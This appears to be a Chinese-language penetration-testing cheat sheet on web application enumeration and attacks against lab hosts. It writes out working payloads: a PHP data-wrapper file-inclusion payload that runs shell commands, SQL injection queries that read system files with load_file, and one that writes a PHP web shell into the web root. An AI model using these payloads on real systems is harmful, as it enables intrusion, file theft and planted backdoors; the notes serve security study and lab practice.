# web应用程序枚举

## 检查url
根据扩展名.php.jsp、.do或 .html判断网站后台用什么语言编写。

## 检查网页源代码
JavaScript 框架、隐藏的输入字段、注释、HTML 中的客户端控件、JavaScript 等等

## 查看响应头
以“X-”开头的标头是非标准 HTTP 标头。1名称或值通常会揭示有关应用程序使用的技术堆栈的附加信息。非标准标头的一些示例包括X-Powered-By、 x-amz-cf-id和X-Aspnet-Version。对这些名称的进一步研究可能会揭示其他信息，例如“x-amz-cf-id”标头，它表明应用程序使用 Amazon CloudFront

## 检查站点地图
robots.txt和 sitemap.xml

## 定位管理后台
Web 服务器通常附带远程管理 Web 应用程序或控制台，它们可以通过特定的 URL 访问，并且通常侦听特定的 TCP 端口
两个常见的例子是分别托管在 /manager/html和/phpmyadmin的Tomcat的manager 1应用程序和MySQL 的phpMyAdmin 

# 网站应用评估

## 目录爆破工具
dirb，dirsearch，gobuster等等

## burpsuite
流量截断，反复请求调试，登录爆破等等

## nikto
综合评估



## LFI

PHP Wrappers

```
http://10.11.0.22/menu.php?file=data:text/plain,hello world

http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
```


# sql注入

## 列号枚举
后面的数字逐渐增加，每次递增order by子句，直到查询产生错误，表示已超过该查询返回的最大列数
```
order by 1
```

## 输出布局

解页面中显示了哪些列,如果只出现了2,3,表示只用到了第二列和第三列的字段
```
union all select 1, 2, 3
```

## 读取文件
```
http://10.11.0.22/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
```

## 写入文件
```
http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```




